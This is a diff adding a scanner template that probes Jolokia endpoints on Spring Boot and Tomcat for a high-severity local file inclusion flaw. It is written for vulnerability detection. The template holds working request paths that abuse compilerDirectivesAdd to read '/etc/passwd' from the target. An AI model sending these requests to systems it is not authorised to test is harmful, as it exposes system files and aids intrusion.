@@ -1,0 +1,27 @@
+id: jolokia-file-read-compilerdirectivesadd
+brief:
+    title: Jolokia - CompilerDirectivesAdd File Read
+    by: dhiyaneshDk
+    level: high
+    about: Jolokia is vulnerable to local file inclusion via compilerDirectivesAdd.
+    label:
+        - jolokia
+        - springboot
+        - tomcat
+        - lfi
+        - misconfig
+        - vuln
+    score: CVSS:8.3
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd'
+        - '{{BaseURL}}/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd'
+      signs:
+        - "on": word
+          has:
+            - compilerDirectivesAdd
+          in: body
+        - "on": status
+          status:
+            - 200
